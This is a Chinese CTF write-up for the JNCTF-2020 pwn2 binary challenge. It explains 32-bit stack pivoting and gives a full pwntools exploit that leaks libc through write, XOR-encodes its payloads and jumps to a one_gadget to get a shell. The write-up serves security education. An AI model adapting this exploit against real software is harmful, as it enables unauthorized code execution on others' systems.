# JNCTF-2020 : jnctf_2020_pwn2

## **【原理】**
32位栈迁移

## **【目的】**
getshell

## **【环境】**
Ubuntu 16.04

## **【工具】**
Pwntools,ida,gdb,one_gadget

## **【步骤】**

name的地方需要一定的字符填充（write和puts均会消耗一定的栈空间），无填充会导致写到不可写的地方，程序崩溃，可以使用one_gadget。


```python
from pwn import*
context.log_level = 'debug'
p = process('./jnctf_2020_pwn2')
elf = ELF('./jnctf_2020_pwn2')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
one_gadget = [0x3ac6c,0x3ac6e,0x3ac72,0x3ac79,0x5fbd5,0x5fbd6]
def pr(a,addr):
	log.success(a+'===>'+hex(addr))
def encode(payload,key):
	result = ''
	for i in range(len(payload)):
		result += p8(ord(payload[i])^key)
	return result 
leave_ret = 0x08048797
vuln = 0x080486B1
name_addr = 0x0804A0A0
write_plt = elf.plt['write']
write_got = elf.got['write']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
p.recvuntil('key:')
key = u8(p.recv(1))
pr('key',key)
#gdb.attach(p,'b *0x08048797')
#==================================================================================
#name = 'a'*0x100+'a'*4+p32(puts_plt)+p32(vuln)+p32(puts_got)
name ='a'*0x100+'a'*4+p32(write_plt)+p32(vuln)+p32(1)+p32(write_got)+p32(4)
payload1 = 'a'*0x30+p32(name_addr+0x100)+p32(leave_ret)
payload1 = encode(payload1,key)
p.sendafter('name:',name)
p.sendafter('message:',payload1)

#===================================leak libc======================================
p.recvuntil('OK!')
write_addr = u32(p.recv(4))
libcbase = write_addr-libc.sym['write']
one = libcbase + one_gadget[0]
pr('write_addr',write_addr)
pr('libcbase',libcbase)
pr('one',one)

#==================================================================================
p.recvuntil('key:')
key = u8(p.recv(1))
pr('key',key)
payload2 = 'a'*0x34+p32(one)
p.sendafter('name:','a')
payload2 = encode(payload2,key)
p.sendafter('message:',payload2)

p.interactive()


```

## **【总结】**
需要熟悉栈的工作机制
